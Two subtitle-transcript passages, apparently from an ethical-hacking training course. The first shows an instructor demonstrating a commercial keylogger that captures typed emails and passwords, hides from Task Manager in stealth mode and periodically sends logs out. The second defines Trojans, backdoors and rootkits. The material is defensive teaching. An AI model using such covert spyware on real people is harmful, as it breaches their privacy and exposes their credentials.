fine.\n\n877\n00:39:10.100 --> 00:39:13.310\nSo we start clicking around,\nso let's say now, right?\n\n878\n00:39:13.310 --> 00:39:18.440\nThat maybe I got out there,\ngo out to Google, I load Chrome up and\n\n879\n00:39:18.440 --> 00:39:22.900\nmaybe I've got an email account.\n\n880\n00:39:22.900 --> 00:39:24.610\nI don't really have\nan email account in Gmail.\n\n881\n00:39:24.610 --> 00:39:27.850\nI'm just making this up, but\npretend for a minute I did.\n\n882\n00:39:27.850 --> 00:39:28.830\nWrite that kinda thing.\n\n883\n00:39:28.830 --> 00:39:30.585\nHey, doesn't recognize it, right?\n\n884\n00:39:30.585 --> 00:39:31.470\n>> Mm-hm.\n>> Whatever,\n\n885\n00:39:31.470 --> 00:39:34.700\nand I go through and I do a bunch of\ndifferent stuff, whatever it may be.\n\n886\n00:39:34.700 --> 00:39:38.140\nI’m going to start grabbing\nall that stuff over time.\n\n887\n00:39:38.140 --> 00:39:40.490\nAnd then, when I get done, eventually,\n\n888\n00:39:40.490 --> 00:39:43.590\nI’m gonna be able to just\nget output of that stuff.\n\n889\n00:39:43.590 --> 00:39:44.790\nI’ll be clicking around.\n\n890\n00:39:44.790 --> 00:39:46.510\nI’ll be opening stuff up.\n\n891\n00:39:46.510 --> 00:39:48.465\nMaybe I’ll open up Super Scan.\n\n892\n00:39:48.465 --> 00:39:50.435\nMaybe I'll go access my\n>> Right.\n\n893\n00:39:50.435 --> 00:39:51.065\n>> Bank site.\n\n894\n00:39:51.065 --> 00:39:53.338\nMaybe I'll do whatever and\neventually I'm gonna get all that data.\n\n895\n00:39:53.338 --> 00:39:59.550\nAnd 30 minutes from now I'll be\nable to go see what's going on.\n\n896\n00:39:59.550 --> 00:40:03.858\nAnd so, maybe I want to Run\nthrough a program like this.\n\n897\n00:40:03.858 --> 00:40:07.220\nAnd just click on a bunch\nof different stuff.\n\n898\n00:40:07.220 --> 00:40:13.760\nAnd then, whoops, and wait,\nactually hold on one second.\n\n899\n00:40:13.760 --> 00:40:15.093\nThat's what I wanna do.\n\n900\n00:40:16.527 --> 00:40:21.510\nOkay, and then I can go ahead.\n\n901\n00:40:21.510 --> 00:40:25.180\nAnd you see I have 23 keys\nlast session used here.\n\n902\n00:40:25.180 --> 00:40:27.595\n13 Windows log, 31 applications.\n\n903\n00:40:27.595 --> 00:40:29.930\nRight, I've got click\nthroughs on different things.\n\n904\n00:40:29.930 --> 00:40:31.960\nYeah, I've three screenshots logged.\n\n905\n00:40:31.960 --> 00:40:34.290\nI've got all sorts of stuff in here,\nright?\n\n906\n00:40:34.290 --> 00:40:36.420\nAnd so,\nyeah I can pull a nice little report.\n\n907\n00:40:36.420 --> 00:40:37.927\nI don't even need to wait for the logs.\n\n908\n00:40:37.927 --> 00:40:41.774\nI just go pull a nice little report here,\nand I can go and\n\n909\n00:40:41.774 --> 00:40:46.520\nsee top ten applications used,\ntop ten e-mail recipients.\n\n910\n00:40:46.520 --> 00:40:50.065\nFiles transfers, files used,\nwebsites visited, right?\n\n911\n00:40:50.065 --> 00:40:56.140\nSo we can take a look at that and\nI can say, webby one or something.\n\n912\n00:40:56.140 --> 00:41:00.470\nAnd I'll just throw it out here\non the desktop just to find it.\n\n913\n00:41:00.470 --> 00:41:01.160\nAll right.\n\n914\n00:41:01.160 --> 00:41:01.904\nSo I'll do that.\n\n915\n00:41:04.612 --> 00:41:06.710\nLoad that up, right?\n\n916\n00:41:06.710 --> 00:41:09.840\nAnd it'll give me information on\nwherever I go and whatever I do.\n\n917\n00:41:09.840 --> 00:41:13.900\nSo if I run it long enough, clearly\nI'll be able to capture all that stuff.\n\n918\n00:41:13.900 --> 00:41:15.240\nAnd all we do is one click.\n\n919\n00:41:15.240 --> 00:41:18.380\nA little jaunt out to Google for\nhalf a second and\n\n920\n00:41:18.380 --> 00:41:19.990\nthen we didn't really do much anyway.\n\n921\n00:41:19.990 --> 00:41:22.680\nBut you get the idea of what's\ngoing to be there, right?\n\n922\n00:41:22.680 --> 00:41:26.647\nSo I can go in and\nif I want to pull the log out.\n\n923\n00:41:29.788 --> 00:41:33.180\nAnd notice it wants to disable UAC, right?\n\n924\n00:41:33.180 --> 00:41:38.000\nNotice when I pull the log on key strokes,\nit may be hard to see for you Mike, but\n\n925\n00:41:38.000 --> 00:41:42.020\nyou can see, when you look Chrome.exe,\nChrome Google Chrome,\n\n926\n00:41:42.020 --> 00:41:45.550\nUser Sally, Time, and\nthen Sys Diag for the actual spy.\n\n927\n00:41:45.550 --> 00:41:48.030\nThing itself so I can go in,\nclick on Chrome and\n\n928\n00:41:48.030 --> 00:41:52.098\nit tells me what I typed right there\nthat's the email address that I actually\n\n929\n00:41:52.098 --> 00:41:55.040\ntyped in when I was just\nfooling around on the webpage.\n\n930\n00:41:55.040 --> 00:41:58.430\n>> And that could have been\nthe password to your bank login or\n\n931\n00:41:58.430 --> 00:42:01.560\nto your corporate secure data so\nyeah all sorts of stuff.\n\n932\n00:42:01.560 --> 00:42:04.350\n>> And speaking of passwords look\nwhat's up on the screen right there.\n\n933\n00:42:04.350 --> 00:42:07.450\nThat's the password to\nconfigure the actual SpyAgent.\n\n934\n00:42:07.450 --> 00:42:10.540\n>> Yes, cuz you type that to get\nback in while it was still running.\n\n935\n00:42:10.540 --> 00:42:13.700\n>> So you got my, and\nthen it shows you I hit the enter key.\n\n936\n00:42:13.700 --> 00:42:14.620\n>> Right.\n>> To actually enter it,\n\n937\n00:42:14.620 --> 00:42:15.395\nso it says enter below.\n\n938\n00:42:15.395 --> 00:42:17.535\n>> Mm-hm.\n>> So you got my super secure password.\n\n939\n00:42:17.535 --> 00:42:18.530\n>> [LAUGH]\n>> Pass1234.\n\n940\n00:42:18.530 --> 00:42:22.260\n>> So you could see that sitting there so\nI'm actually able to see that.\n\n941\n00:42:22.260 --> 00:42:23.470\nI got everything, right?\n\n942\n00:42:23.470 --> 00:42:26.040\nTake a look at Windows viewed.\n\n943\n00:42:26.040 --> 00:42:28.260\nI can see all the different windows.\n\n944\n00:42:28.260 --> 00:42:31.440\nI opened up the HTT track or\nHT track program.\n\n945\n00:42:31.440 --> 00:42:32.460\nExplorer.\n\n946\n00:42:32.460 --> 00:42:33.690\nChrome.\nI've got all that stuff.\n\n947\n00:42:33.690 --> 00:42:36.540\nIt shows me all the stuff I did and\nwhat I did.\n\n948\n00:42:36.540 --> 00:42:38.380\nSo I can click on that and see.\n\n949\n00:42:38.380 --> 00:42:41.280\nI went in and I looked at this\nparticular piece of software.\n\n950\n00:42:41.280 --> 00:42:46.120\nSo it shows me all the different\nthings I did, I can see program usage.\n\n951\n00:42:46.120 --> 00:42:48.815\nI can see, this is kind of a cool one,\nthe event timeline.\n\n952\n00:42:48.815 --> 00:42:52.813\nI can see exactly what I did when, so\nI can actually see monitoring started,\n\n953\n00:42:52.813 --> 00:42:56.580\nFile created, look, I viewed\na window there for the app, right?\n\n954\n00:42:56.580 --> 00:43:00.050\nWent in, started a program,\nright, went in,\n\n955\n00:43:00.050 --> 00:43:04.670\ndid some viewing around, did all sorts\nof stuff, did that for so much time.\n\n956\n00:43:04.670 --> 00:43:06.850\nThen I started Chrome, right?\n\n957\n00:43:06.850 --> 00:43:11.556\nSo I can click through and\nI can see all sorts of stuff, right?\n\n958\n00:43:11.556 --> 00:43:12.250\nSo it's actually.\n\n959\n00:43:12.250 --> 00:43:17.385\n>> Very impressive and of course we\nwere doing this in full on admin mode if\n\n960\n00:43:17.385 --> 00:43:22.888\nswitched to stealth mode none of these\nwindows would have been popping up.\n\n961\n00:43:22.888 --> 00:43:26.480\nWe would have seen that little warning and\nthings like that.\n\n962\n00:43:26.480 --> 00:43:29.450\nYou wouldn't have any idea what\nwas running in the background and\n\n963\n00:43:29.450 --> 00:43:33.990\nit can very well be FTPing me every\ntwo hours all of your keystrokes.\n\n964\n00:43:33.990 --> 00:43:35.760\n>> Absolutely, every 30 minutes actually.\n\n965\n00:43:35.760 --> 00:43:37.340\nAll that stuff so you wouldn't.\n\n966\n00:43:37.340 --> 00:43:39.528\nYeah I put it up and\nlit it up like a Christmas tree.\n\n967\n00:43:39.528 --> 00:43:40.608\n>> Yeah.\n>> So, we'd be able to interact,\n\n968\n00:43:40.608 --> 00:43:41.380\nwe'd be able to see it.\n\n969\n00:43:41.380 --> 00:43:43.040\nAnd obviously tell what's going on there.\n\n970\n00:43:43.040 --> 00:43:45.220\nBut yeah if I did this in stealth\nmode you wouldn't know nothing,\n\n971\n00:43:45.220 --> 00:43:46.370\nyou wouldn't be able to see anything.\n\n972\n00:43:46.370 --> 00:43:47.895\n>> Right.\n>> And I would just remote in and\n\n973\n00:43:47.895 --> 00:43:50.919\nremember that I would be sitting here\ndrinking my coffee on my blackberry,\n\n974\n00:43:50.919 --> 00:43:52.310\ntaking a look at this console\n>> Right.\n\n975\n00:43:52.310 --> 00:43:54.920\n>> And essentially watching you\ndo this in almost real time.\n\n976\n00:43:54.920 --> 00:43:58.180\nSo that's what we can do with\nthe Key Logger, essentially and spy.\n\n977\n00:43:58.180 --> 00:43:59.510\nSoftware like Spy Agent.\n\n978\n00:43:59.510 --> 00:44:03.270\nAll sorts of programs out there that do\nthis but this is an example of the kind of\n\n979\n00:44:03.270 --> 00:44:06.980\nstuff, as a hacker, you may be able to\nget on the system and be able to use.\n\n980\n00:44:08.020 --> 00:44:11.360\n>> Yeah and we have trouble seeing\nit happen because, like you said,\n\n981\n00:44:11.360 --> 00:44:12.170\nit is gonna hide itself.\n\n982\n00:44:12.170 --> 00:44:14.590\n>> So, if we were talking about rootkits,\nnot quite a rootkit but\n\n983\n00:44:14.590 --> 00:44:15.360\nit's gonna do the same thing.\n\n984\n00:44:15.360 --> 00:44:18.180\nIt's gonna hide itself from,\nsay, task manager.\n\n985\n00:44:18.180 --> 00:44:19.420\n>> So we just won't see it running.\n\n986\n00:44:19.420 --> 00:44:20.740\n>> Absolutely.\n>> Yeah, this will stealth itself,\n\n987\n00:44:20.740 --> 00:44:21.980\nyou won't see it running at all.\n\n988\n00:44:21.980 --> 00:44:22.930\n>> Very Good.\n\n989\n00:44:22.930 --> 00:44:24.510\n>> All right, Adam, great look there.\n\n990\n00:44:24.510 --> 00:44:27.880\nGreat demonstration on some of those\nsystem hacking tools that we can use,\n\n991\n00:44:27.880 --> 00:44:31.740\nthings that we can, as the bad guy or the\nbad actors can be using, as a good guy,\n\n992\n00:44:31.740 --> 00:44:32.800\nas a CEH.\n\n993\n00:44:32.800 --> 00:44:36.630\n>> We got to be aware of, and\nmake sure it's not running on our systems.\n\n994\n00:44:36.630 --> 00:44:38.430\nSo we thank you for\nthose great demonstrations.\n\n995\n00:44:38.430 --> 00:44:40.376\nHope everybody out there enjoyed watching.\n\n996\n00:44:40.376 --> 00:44:44.290\nSigning off for IT Pro TV,\nI'm Mike Rodrick, I think.\n\n997\n00:44:44.290 --> 00:44:45.405\n>> Rodrick?\n\n998\n00:44:45.405 --> 00:44:48.580\n>> [LAUGH]\n>> And I'm not Mike Rodrick.\n\n999\n00:44:48.580 --> 00:44:50.320\n>> And we'll see you next time.\n\n1000\n00:44:50.320 --> 00:44:56.508\n[MUSIC]\n\n",

00:00:19.326\nI'm your host, Mike Rodrick and today we\nare doing our Certified Ethical Hacker,\n\n4\n00:00:19.326 --> 00:00:19.900\nversion 9.\n\n5\n00:00:19.900 --> 00:00:24.170\nAnd specifically in this episode, we're\ngonna be taking a look at malware threats.\n\n6\n00:00:24.170 --> 00:00:27.790\nWe're going to talk about the different\ntypes of threats that we face.\n\n7\n00:00:27.790 --> 00:00:29.790\nWhat we can do with\nthe these types of threats,\n\n8\n00:00:29.790 --> 00:00:31.840\nand how we can counteract them as well.\n\n9\n00:00:31.840 --> 00:00:34.110\nAnd here to help us,\nof course, is Mr. Adam Gordon.\n\n10\n00:00:34.110 --> 00:00:35.200\nHow are you doing Adam?\n\n11\n00:00:35.200 --> 00:00:36.180\n&gt;&gt; I'm good, I'm good.\n\n12\n00:00:36.180 --> 00:00:37.930\nHopefully everybody out\nthere is doing well.\n\n13\n00:00:37.930 --> 00:00:41.869\nGood to be back, always nice to\nspend time with you guys at ITProTV.\n\n14\n00:00:41.869 --> 00:00:44.431\nTalking a little bit about malware,\nas Mike was saying.\n\n15\n00:00:44.431 --> 00:00:47.690\nAnd the best way to start talking\nabout malware and thinking about it,\n\n16\n00:00:47.690 --> 00:00:49.458\naside from keeping up with the news and\n\n17\n00:00:49.458 --> 00:00:53.235\nseeing all the evidence [LAUGH] of it out\nthere, is probably to define some terms.\n\n18\n00:00:53.235 --> 00:00:57.225\nOne of the things we've talked about a lot\non our other episodes is the importance of\n\n19\n00:00:57.225 --> 00:00:58.536\nvocabulary to what we do and\n\n20\n00:00:58.536 --> 00:01:01.279\nhow we do the things in security\nthat are important to us.\n\n21\n00:01:01.279 --> 00:01:04.989\nAnd having knowledge of the terminology,\nessentially speaking the language,\n\n22\n00:01:04.989 --> 00:01:08.437\nif you will, of the hacker, is important\nfor the security professional.\n\n23\n00:01:08.437 --> 00:01:12.739\nBecause it allows us to talk to our peers,\nour colleagues, in a way that allows them\n\n24\n00:01:12.739 --> 00:01:17.250\nto understand what it is we're focused on\nfrom a risk, avulnerability perspective.\n\n25\n00:01:17.250 --> 00:01:22.790\nIt also helps us to key in and identify on\nthings that are gonna important for us.\n\n26\n00:01:22.790 --> 00:01:25.440\nBut also, to standardize the discussion.\n\n27\n00:01:25.440 --> 00:01:28.342\nSo when I ask you, Mike, for\ninstance hypothetically,\n\n28\n00:01:28.342 --> 00:01:30.820\nhow would you define\nthe difference between, or\n\n29\n00:01:30.820 --> 00:01:35.360\nwhat would you think is the key defining\ncharacteristic between a virus and a worm?\n\n30\n00:01:35.360 --> 00:01:37.360\nWhat would we talk about there for\ninstance?\n\n31\n00:01:37.360 --> 00:01:40.422\n&gt;&gt; Maybe the way that they're transmitted,\nthe way they spread.\n\n32\n00:01:40.422 --> 00:01:43.650\n&gt;&gt; Okay, so as Mike points out, and we're\ngonna talk about this more in a minute.\n\n33\n00:01:43.650 --> 00:01:44.210\nVery good, by the way.\n\n34\n00:01:44.210 --> 00:01:45.744\nTake a gold star out of petty cash for\nthat one.\n\n35\n00:01:45.744 --> 00:01:47.070\n&gt;&gt; [LAUGH]\n&gt;&gt; That's good.\n\n36\n00:01:47.070 --> 00:01:49.915\nFirst day back on the job and Mike's\nalready out of the gate with a winner.\n\n37\n00:01:49.915 --> 00:01:51.780\n&gt;&gt; [LAUGH]\n&gt;&gt; So the difference here, and\n\n38\n00:01:51.780 --> 00:01:53.330\nwe'll talk about this in our definitions.\n\n39\n00:01:53.330 --> 00:01:55.905\nAnd I know we have a definition\nlist we're gonna talk about, or\n\n40\n00:01:55.905 --> 00:01:57.900\nuse to talk about these terms with you.\n\n41\n00:01:57.900 --> 00:02:00.477\nBut the key differentiator\nhere is how a worm and\n\n42\n00:02:00.477 --> 00:02:03.254\na virus essentially replicate or\nhow they spread.\n\n43\n00:02:03.254 --> 00:02:05.162\nAnd there is a distinction\nwe want to focus on.\n\n44\n00:02:05.162 --> 00:02:07.137\nSo let's put up our\nvocabulary list if we can,\n\n45\n00:02:07.137 --> 00:02:10.060\nI wanna go through some terms\nwith you first to get us stated.\n\n46\n00:02:10.060 --> 00:02:13.080\nSo you'll see there,\nwe've got a bunch of different vocabulary.\n\n47\n00:02:13.080 --> 00:02:15.190\nLet's start at the top with Trojan horse.\n\n48\n00:02:15.190 --> 00:02:16.750\nThe idea of a Trojan horse,\nand by the way,\n\n49\n00:02:16.750 --> 00:02:20.980\nthese are all examples of generically\nwhat we would classify today as malware.\n\n50\n00:02:20.980 --> 00:02:25.060\nSo years ago you would hear people in\nour industry talk about malware and\n\n51\n00:02:25.060 --> 00:02:26.430\nthey would say, you have malware.\n\n52\n00:02:26.430 --> 00:02:30.940\nAnd they were really talking about maybe\na very specific instance of something.\n\n53\n00:02:30.940 --> 00:02:35.770\nAnd they would differentiate between\na Trojan, a rootkit, and ransomware, and\n\n54\n00:02:35.770 --> 00:02:38.620\nthings like that and say well,\nthose are different kinds or\n\n55\n00:02:38.620 --> 00:02:40.480\ndifferent types of things.\n\n56\n00:02:40.480 --> 00:02:42.330\nThey are, absolutely, they're categories.\n\n57\n00:02:42.330 --> 00:02:46.010\nBut generically, we roll them all\nup under the concept of malware.\n\n58\n00:02:46.010 --> 00:02:50.280\nAnd so when we talk about malware,\nwe talk about any kind of software, or\n\n59\n00:02:50.280 --> 00:02:55.630\nany kind of program or some sort of code,\nexploit code of some kind,\n\n60\n00:02:55.630 --> 00:02:58.950\nthat is gonna seek to gain advantage,\ntaking over a system.\n\n61\n00:02:58.950 --> 00:03:01.670\nAnd in so doing,\neither disable functionality,\n\n62\n00:03:01.670 --> 00:03:05.970\nrender the system inoperable,\nperhaps somewhere between those two\n\n63\n00:03:05.970 --> 00:03:09.840\ntake over the system and\ngain control for an outside force.\n\n64\n00:03:09.840 --> 00:03:14.280\nUsually sitting dormant until called upon\nand then maybe executing some sort of\n\n65\n00:03:14.280 --> 00:03:20.010\na attack or some sort of a system change\nthat allows us to use that system to then,\n\n66\n00:03:20.010 --> 00:03:22.450\nto our advantage,\ntake over and do other things.\n\n67\n00:03:22.450 --> 00:03:26.280\nSo as a category, all the stuff we're\ntalking about here is considered or\n\n68\n00:03:26.280 --> 00:03:28.400\nclassified as malware today.\n\n69\n00:03:28.400 --> 00:03:32.020\nThe Trojan horse, kinda classic example,\nright, of what we talk about.\n\n70\n00:03:32.020 --> 00:03:36.335\nThe idea here, as we talk about\nup in the definition there,\n\n71\n00:03:36.335 --> 00:03:40.285\na program of some kind disguising\nits true intention, right?\n\n72\n00:03:40.285 --> 00:03:44.897\nSo when you download\nthe happyfacescreensaver.com or\n\n73\n00:03:44.897 --> 00:03:50.340\nhappyfacescreensaver.exe software\npackage from the Happy Face website, and\n\n74\n00:03:50.340 --> 00:03:54.855\nyou're all excited cuz you think you're\ngetting the latest LOL cat screensaver or\n\n75\n00:03:54.855 --> 00:03:55.640\nsomething.\n\n76\n00:03:55.640 --> 00:03:59.230\nWhat actually then happens is you probably\nget that, because that's the wrapper,\n\n77\n00:03:59.230 --> 00:04:02.610\nif you will, right, the package\noutside that makes it look legitimate.\n\n78\n00:04:02.610 --> 00:04:06.000\nBut inside of that, you're then\ngonna get a nasty surprise, right,\n\n79\n00:04:06.000 --> 00:04:08.252\nsomething else that we\nweren't counting on.\n\n80\n00:04:08.252 --> 00:04:13.044\nWhich is gonna be this piece of software\nthat will allow an attacker to either get\n\n81\n00:04:13.044 --> 00:04:17.330\nup to no good on your system or\nsomehow gain control, take it over.\n\n82\n00:04:17.330 --> 00:04:21.520\nWe often talk about remote access Trojans,\nwhat are called RATs, as being part of\n\n83\n00:04:21.520 --> 00:04:27.330\nthis family, where somebody will infect\nyou generically with some sort of Trojan.\n\n84\n00:04:27.330 --> 00:04:30.620\nBut the Trojan package\nitself is a remote access\n\n85\n00:04:30.620 --> 00:04:34.170\nset of tools that allow them to take over,\nthem being the bad actor, right?\n\n86\n00:04:34.170 --> 00:04:39.820\nAllow them to take over the machine and\neither zombie it or botify it.\n\n87\n00:04:39.820 --> 00:04:42.220\nWe talk about different\nconcepts generically, right?\n\n88\n00:04:42.220 --> 00:04:43.800\nGone are the days where we just say, yes,\n\n89\n00:04:43.800 --> 00:04:46.455\nwe have an army of machines\nwaiting to do you harm.\n\n90\n00:04:46.455 --> 00:04:48.350\n&gt;&gt; [LAUGH]\n&gt;&gt; We have to have all these crazy\n\n91\n00:04:48.350 --> 00:04:48.920\nconcepts.\n\n92\n00:04:48.920 --> 00:04:52.500\nAnd so we talk about botnets or\nzombie nets today.\n\n93\n00:04:52.500 --> 00:04:55.360\nAnd the reality of that is that we\nhave remote access Trojans that take\n\n94\n00:04:55.360 --> 00:04:59.990\nthe machines over and allow us to then,\nas a bad actor, control them from outside.\n\n95\n00:04:59.990 --> 00:05:02.350\nThese are all examples of Trojan horses.\n\n96\n00:05:02.350 --> 00:05:03.440\nWhat about backdoors?\n\n97\n00:05:03.440 --> 00:05:05.982\nA backdoor is a method,\nas you see there, often secret.\n\n98\n00:05:05.982 --> 00:05:09.595\nSo we would talk about it as\nbeing either a covert channel,\n\n99\n00:05:09.595 --> 00:05:11.660\nto use the language of security,\n\n100\n00:05:11.660 --> 00:05:16.602\nwe often talk about something that is\na communication pathway that is unknown,\n\n101\n00:05:16.602 --> 00:05:22.080\nunlooked for, unrecognized by us, right,\nas we scan and we look at the machine.\n\n102\n00:05:22.080 --> 00:05:25.840\nAnd it allows us to bypass the normal\nauthentication, areas of a system or\n\n103\n00:05:25.840 --> 00:05:27.740\nnormal processes in the system.\n\n104\n00:05:27.740 --> 00:05:31.290\nSo that we can use the system\nwithout the direct knowledge or\n\n105\n00:05:31.290 --> 00:05:34.210\nwithout the authentication\nmechanisms normally that are there,\n\n106\n00:05:34.210 --> 00:05:35.655\nstopping us as a bad actor.\n\n107\n00:05:35.655 --> 00:05:39.570\nBackdoors are often the result of\na system being Trojaned where we\n\n108\n00:05:39.570 --> 00:05:41.970\nallow some sort of software to operate.\n\n109\n00:05:41.970 --> 00:05:45.190\nWe were joking around about\nBack Orifice and some of the oldies but\n\n110\n00:05:45.190 --> 00:05:49.386\ngoodies that we used to play with\nin your old hacking systems, right?\n\n111\n00:05:49.386 --> 00:05:52.868\nWhen we talk about Windows 9X and\nWindows XP and things like that,\n\n112\n00:05:52.868 --> 00:05:56.989\nsome of these old Trojans are still\naround, and in theory, can still be used.\n\n113\n00:05:56.989 --> 00:06:00.128\nAlthough you don't really see them\nanymore, SubSeven, another one,\n\n114\n00:06:00.128 --> 00:06:01.680\nif you remember SubSeven, right?\n\n115\n00:06:01.680 --> 00:06:05.100\nSo there's all these different ones, and\nthere's many new ones today of course.\n\n116\n00:06:05.100 --> 00:06:09.110\nBut any of them would've been Trojans\nthat could've remoted into the system,\n\n117\n00:06:09.110 --> 00:06:11.892\ncontrolled it, but\nthen would have backdoored the system.\n\n118\n00:06:11.892 --> 00:06:15.005\nThe Back Orifice one would have been the\none that you could control the system so\n\n119\n00:06:15.005 --> 00:06:19.720\neverybody used to have their CD-ROM\ntrays open and all that crazy stuff.\n\n120\n00:06:20.790 --> 00:06:21.650\nYou see that commercial?\n\n121\n00:06:22.900 --> 00:06:25.465\nI think it was for, what was it for?\n\n122\n00:06:25.465 --> 00:06:28.064\nIt was the older ladies,\nthey were on there and\n\n123\n00:06:28.064 --> 00:06:32.837\nthey were doing the whole Facebook\nthing like, I'm gonna unfriend you.\n\n124\n00:06:32.837 --> 00:06:33.381\n&gt;&gt; Yeah.\n\n125\n00:06:33.381 --> 00:06:34.590\n&gt;&gt; Do you remember them arguing?\n\n126\n00:06:34.590 --> 00:06:37.428\nAnd she's got, the one woman\nhas the CD-ROM holder open and\n\n127\n00:06:37.428 --> 00:06:39.327\nshe's got the tea cup sitting in there.\n\n128\n00:06:39.327 --> 00:06:40.922\n&gt;&gt; [LAUGH]\n&gt;&gt; Cuz we used to joke about that\n\n129\n00:06:40.922 --> 00:06:41.425\nall the time.\n\n130\n00:06:41.425 --> 00:06:44.274\nYou're just gonna be like yeah,\nthat's your coffee, your coffee holder,\n\n131\n00:06:44.274 --> 00:06:45.690\nyour cup holder on the machine.\n\n132\n00:06:45.690 --> 00:06:47.700\nWhen people didn't know what\nyou were doing, you'd open and\n\n133\n00:06:47.700 --> 00:06:49.730\nclose it with the remote access software.\n\n134\n00:06:49.730 --> 00:06:52.040\nBut they actually made a series\nof commercials, right?\n\n135\n00:06:52.040 --> 00:06:53.314\n&gt;&gt; I remember that, yes.\n&gt;&gt; And one of them was,\n\n136\n00:06:53.314 --> 00:06:54.835\nshe was sitting there on the computer.\n\n137\n00:06:54.835 --> 00:07:01.349\nShe had the old PC, the huge chassis and\nthe monitor and she had the tray open.\n\n138\n00:07:01.349 --> 00:07:05.035\nAnd she actually had her coffee or tea\ncup sitting there and she was working and\n\n139\n00:07:05.035 --> 00:07:07.020\nit was just, anyway I digress.\n\n140\n00:07:07.020 --> 00:07:08.800\nSo, let's stop dating ourselves.\n\n141\n00:07:08.800 --> 00:07:10.330\nWe'll get back to what\nwe're talking about here.\n\n142\n00:07:10.330 --> 00:07:12.610\nSo we had Trojan horses, we had backdoors.\n\n143\n00:07:12.610 --> 00:07:15.630\nSo just keep in mind, these are the kind\nof things we're thinking of here.\n\n144\n00:07:15.630 --> 00:07:19.570\nWith regards to a rootkit, you often\nhear about a system being rooted.\n\n145\n00:07:19.570 --> 00:07:23.120\nA system that's been rooted or\njailbroken is another term you often hear.\n\n146\n00:07:23.120 --> 00:07:26.890\nWhen you think about mobile devices,\nphones especially, prevalent on\n\n147\n00:07:26.890 --> 00:07:30.681\nthe Android platform, becoming more\nprevalent on the Apple platform.\n\n148\n00:07:30.681 --> 00:07:34.370\nWhich is a problem for a lot of\nreasons from a security standpoint.\n\n149\n00:07:34.370 --> 00:07:36.000\nI heard an interesting statistic recently.\n\n150\n00:07:36.000 --> 00:07:40.528\nThey were doing some kind of roll up\non all the malware that's out there and\n\n151\n00:07:40.528 --> 00:07:41.561\nall this stuff.\n\n152\n00:07:41.561 --> 00:07:44.089\nAround the middle of the year is where\nyou often see a lot of these reports\n\n153\n00:07:44.089 --> 00:07:44.905\nstarting to come out.\n\n154\n00:07:44.905 --> 00:07:49.246\nWe're into the latter part of 2016 and\nso all the aggregated data for\n\n155\n00:07:49.246 --> 00:07:53.105\n2016, looking back at 2015,\nhas started to come out.\n\n156\n00:07:53.105 --> 00:07:55.911\nThe Verizon data breach report,\nthe Ponemon report,\n\n157\n00:07:55.911 --> 00:07:57.807\nall the standard ones we talk about.\n\n158\n00:07:57.807 --> 00:08:01.367\nAnd one of the things I saw with\nregards to an announcement about,\n\n159\n00:08:01.367 --> 00:08:06.240\nit's actually coming out blackout so it\nwas in the last, probably 30 days or so.\n\n160\n00:08:06.240 --> 00:08:08.940\nThey were talking about ransomware or,\nI'm sorry, rootware.\n\n161\n00:08:10.280 --> 00:08:11.395\nI'm talking about rootkits.\n\n162\n00:08:11.395 --> 00:08:14.163\nI'm created a new category of\nmalware as I look down at my notes.\n\n163\n00:08:14.163 --> 00:08:15.831\nThey were talking about\nabout root kits and\n\n164\n00:08:15.831 --> 00:08:19.380\nthe prevalence on the Android platform,\nand the fact there was a new rootkit.\n\n165\n00:08:19.380 --> 00:08:23.320\nA new piece of malware that had come out\nspecifically that it potentially would,\n\n166\n00:08:23.320 --> 00:08:25.400\nin fact, be a problem for\n\n167\n00:08:25.400 --> 00:08:28.210\nevery Android device currently\nrunning on the planet today.\n\n168\n00:08:28.210 --> 00:08:28.780\n&gt;&gt; Really?\n&gt;&gt; Yeah,\n\n169\n00:08:28.780 --> 00:08:32.980\nthis is one of the ones they demoed at\nBlack Hat this year that, if allowed to\n\n170\n00:08:32.980 --> 00:08:36.980\nget in the wild, and ultimately if used\n&gt;&gt; And exploited could affect everybody.\n\n171\n00:08:36.980 --> 00:08:38.720\nWe're talking about like\nover a billion devices.\n\n172\n00:08:38.720 --> 00:08:39.230\n&gt;&gt; And that's scary.\n\n173\n00:08:39.230 --> 00:08:40.120\n&gt;&gt; Kinda crazy.\n\n174\n00:08:40.120 --> 00:08:41.920\nYeah, so, you know interesting.\n\n175\n00:08:41.920 --> 00:08:44.301\nBut hey, happy Monday, there you go.\n\n176\n00:08:44.301 --> 00:08:46.798\n&gt;&gt; [LAUGH]\n&gt;&gt; So let's go back to our definition.\n\n177\n00:08:46.798 --> 00:08:47.575\nSo root kits.\n\n178\n00:08:47.575 --> 00:08:50.525\nThese are pieces of software again,\nin the malware category.\n\n179\n00:08:50.525 --> 00:08:53.425\nLoaded, a lot of times,\ndelivered through a trojan horse.\n\n180\n00:08:53.425 --> 00:08:57.555\nDelivered as a payload in another,\nmalware attack of some kind.\n\n181\n00:08:57.555 --> 00:08:59.730\nLeft in the system, burrowing deep,\n\n182\n00:08:59.730 --> 00:09:03.760\nalmost impossible to find unless you have\nspecialized software that will detect it.\n\n183\n00:09:03.760 --> 00:09:07.290\nWe often find a lot of root kit\ndetectors specific to the various\n\n184\n00:09:07.290 --> 00:09:10.920\nroot kits that are out there that you\nhave to use to disinfect a system.\n\n185\n00:09:10.920 --> 00:09:15.740\nAnd this will allow full administrative\ncontrol, hence the name root kit.\n\n186\n00:09:15.740 --> 00:09:16.448\nRoot, control.\n\n187\n00:09:16.448 --> 00:09:19.968\nTo be given to the bad actor,\nwho can then use it against the machine.\n\n188\n00:09:19.968 --> 00:09:21.959\nSo when you jailbreak or root a machine,\n\n189\n00:09:21.959 --> 00:09:25.920\nyou are installing other software\nthat allows you to burrow underneath.\n\n190\n00:09:25.920 --> 00:09:29.250\nA lot of times you'll dual boot these\nsystems right on mobile platforms,\n\n191\n00:09:29.250 --> 00:09:32.578\nyou want to load an unauthorized version\nof Android or whatever it is, and\n\n192\n00:09:32.578 --> 00:09:35.040\nyou'll root the system or\njailbreak it to do that.\n\n193\n00:09:35.040 --> 00:09:35.910\nSame idea.\n\n194\n00:09:35.910 --> 00:09:37.500\nThe challenge is, you have to be careful.\n\n195\n00:09:37.500 --> 00:09:41.960\nBecause a lot of times you'll download\nthese operating system image files, and\n\n196\n00:09:41.960 --> 00:09:46.600\nwhen you do that, what's gonna happen is,\nand my mouse stopped working, there we go.\n\n197\n00:09:46.600 --> 00:09:50.180\nWhat's gonna happen is, just keeping the\nlab environment fresh for you guys, when\n\n198\n00:09:50.180 --> 00:09:53.281\nwe want to use it we can actually go in\nand show you some cool stuff about virus.\n\n199\n00:09:53.281 --> 00:09:57.300\nWhat will happen with\nthat is ultimately that\n\n200\n00:09:57.300 --> 00:10:01.130\na lot of times those operating system\nimages are 